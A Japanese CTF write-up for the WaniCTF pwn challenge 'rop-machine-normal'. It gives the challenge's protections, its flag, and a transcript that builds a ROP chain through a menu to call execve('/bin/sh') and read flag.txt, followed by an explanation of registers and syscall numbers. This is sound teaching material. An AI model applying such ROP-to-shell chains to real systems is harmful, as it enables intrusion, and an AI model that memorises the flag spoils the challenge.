# rop-machine-normal [pwn]
## 問題文

```
nc rop-normal.pwn.wanictf.org 9004
```

### ヒント

+ ropでexecve("/bin/sh", 0, 0)を実行して下さい。
+ "/bin/sh"のアドレスは提供されています
+ execveのsyscall番号は0x3bです。
+ rop machineの使い方->[wani-hackase/rop-machine](https://github.com/wani-hackase/rop-machine/)

### 使用ツール例
+ [netcat (nc)](https://github.com/wani-hackase/memo-setup-pwn-utils#netcat)

### gccのセキュリティ保護

+ *Partial RELocation ReadOnly (RELRO)*
+ Stack Smash Protection (SSP)有効
+ No eXecute bit(NX)有効
+ *Position Independent Executable (PIE)無効*

## FLAG

```
FLAG{now-you-can-call-any-system-calls-with-syscall}
```

## 解法

### はじめに

まずは解法例。
execveのropを組みます。

```
$ nc rop-normal.pwn.wanictf.org 9004

"/bin/sh" address is 0x404070

[menu]
1. append hex value
2. append "pop rdi; ret" addr
3. append "pop rsi; ret" addr
4. append "pop rdx; ret" addr
5. append "pop rax; ret" addr
6. append "syscall; ret" addr
8. show menu (this one)
9. show rop_arena
0. execute rop
> 2
"pop rdi; ret" is appended
> 1
hex value?: 0x404070
0x0000000000404070 is appended
> 3
"pop rsi; ret" is appended
> 1
hex value?: 0
0x0000000000000000 is appended
> 4
"pop rdx; ret" is appended
> 1
hex value?: 0
0x0000000000000000 is appended
> 5
"pop rax; ret" is appended
> 1
hex value?: 3b
0x000000000000003b is appended
> 6
"syscall; ret" is appended
> 0
     rop_arena
+--------------------+
| pop rdi; ret       |<- rop start
+--------------------+
| 0x0000000000404070 |
+--------------------+
| pop rsi; ret       |
+--------------------+
| 0x0000000000000000 |
+--------------------+
| pop rdx; ret       |
+--------------------+
| 0x0000000000000000 |
+--------------------+
| pop rax; ret       |
+--------------------+
| 0x000000000000003b |
+--------------------+
| syscall; ret       |
+--------------------+
ls
chall
flag.txt
redir.sh
cat flag.txt
FLAG{now-you-can-call-any-system-calls-with-syscall}
^C
$
```

### 解説

この問題は03-rop-machine-easyの正答者数の80%～90%の正答者数と狙い通りの誘導はできている印象です。
03-rop-machine-easyの回答への誘導がもっとうまく行っていれば．．．と悔やんでも悔やみきれない感じです。

抑えなければならないポイントは以下の2つです。
1. 第1～第3引数を渡した関数呼び出しををアセンブラで呼べること
2. execveなどのシステムコールの呼ばれ方が分かっていること

#### 1. 第1～第3引数を渡した関数呼び出しををアセンブラで呼べること

まず、今回呼ばなければならないシステムコールをC言語で書くと以下の通りとなります。

```
execve("/bin/sh", 0, 0);
```
execveはプログラムを実行するシステムコールです。
第1引数(RDI)には実行したいプログラム、第2引数(RSI)にはそのプログラムに渡したい引数、第3引数(RDX)には環境変数を渡します。
`/bin/sh`のアドレスは与えられていて`0x404070`なので
```
execve(0x404070, 0, 0);
```
を呼び出せば良いことになります。
関数を呼び出す場合には
- 第1引数: RDIレジスタ
- 第2引数: RSIレジスタ
- 第3引数: RDXレジスタ

のレジスタにそれぞれ値をセットします。
なのでスタックからポップしてレジスタに設定する用のガジェットを以下の通り並べます。
```
+--------------------+
| pop rdi; ret       |
+--------------------+
| 0x0000000000404070 |
+--------------------+
| pop rsi; ret       |
+--------------------+
| 0x0000000000000000 |
+--------------------+
| pop rdx; ret       |
+--------------------+
| 0x0000000000000000 |
+--------------------+
```

#### 2. execveなどのシステムコールの呼ばれ方が分かっていること

システムコールとは、OSが提供するAPIを呼ぶための仕組みです。
よりCPUに近い機能を使った関数群になっています。
システムコールは[/usr/include/x86_64-linux-gnu/asm/unistd_64.h](https://www.apt-browse.org/browse/ubuntu/precise/main/amd64/linux-libc-dev/3.2.0-23.36/file/usr/include/x86_64-linux-gnu/asm/unistd_64.h)に記載されています．
システムコールが呼ばれるとき、ユーザプログラムではRAXレジスタにシステムコールに対応するシステムコール番号を設定して`syscall`命令を呼びます．
するとソフトウェア割り込みが入ってOS側でRAXレジスタをチェックしてユーザからどのシステムコールが呼ばれたかを判定して該当するシステムコールの処理を実行します。
ヒントや[/usr/include/x86_64-linux-gnu/asm/unistd_64.h](https://www.apt-browse.org/browse/ubuntu/precise/main/amd64/linux-libc-dev/3.2.0-23.36/file/usr/include/x86_64-linux-gnu/asm/unistd_64.h)を見てわかる通り、execveのシステムコール番号は0x3b (10進数だと59)になります。

というわけでガジェットを以下の通り並べます。
```
+--------------------+
| pop rax; ret       |
+--------------------+
| 0x000000000000003b |
+--------------------+
| syscall; ret       |
+--------------------+
```

そして上記1と2をまとめて実行するとシェルが呼び出せます。
